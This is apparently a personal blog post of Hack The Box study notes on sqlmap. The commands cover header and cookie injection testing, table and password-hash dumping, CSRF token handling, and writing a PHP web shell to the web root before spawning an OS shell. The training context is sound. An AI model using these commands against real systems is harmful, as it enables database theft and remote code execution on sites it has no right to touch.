...
description: "Automated SQL injection testing, request file parsing, database dumping, OS shell spawning, and tamper script usage."
image:
  path: /assets/img/posts/sqlmap.jpg
  alt: sqlmap essentials
---
...
you can need to try prefixes - suffixes by hand / sometimes specifying union value gives results
...
```bash
Fau5t@htb[/htb]$ sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'
```
...
```bash
Fau5t@htb[/htb]$ sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
...
```bash
Fau5t@htb[/htb]$ sqlmap -r req.txt
        ___
```
...
```bash
Fau5t@htb[/htb]$ sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'

```

### for cookie stuff

we can also need to specify `--level 2` parameter for sqlmap to look in cookie 
...
```bash
Fau5t@htb[/htb]$ sqlmap ... -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
...
```bash
Fau5t@htb[/htb]$ sqlmap -u www.target.com --data='id=1' --method PUT
```
...
## Getting spesific results

```bash
 python3 /usr/bin/sqlmap -r req5.txt --technique=B -T flag5 --dump

```

when we do that, we get table contents

## Database Enumaration
...
- `-- tables` for tables, with specifying -D testdb
- `--dump` for getting contents
- `--schema`: for schema
...
```bash
Fau5t@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname
...
```bash
Fau5t@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3
...
```bash
Fau5t@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"
...
```bash
Fau5t@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --search -T user
...
```bash
eger tablo veya column name arayacaksan --search
tablo icindeki spesifik row aricaksan --which
--which="name LIKE '%joe%'" 
```
...
```bash
Fau5t@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --passwords --batch
```
...
```bash
Fau5t@htb[/htb]$ sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
...
```bash
Fau5t@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5 | grep URI
...
```bash
Fau5t@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 | grep URI
...
without dba access we cant do it.
...
```bash
Fau5t@htb[/htb]$ sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba
```
...
```bash
Fau5t@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
...
```bash
Fau5t@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
...
we can also try to run it with sqlmap built in os shell function

```bash
Fau5t@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --os-shell
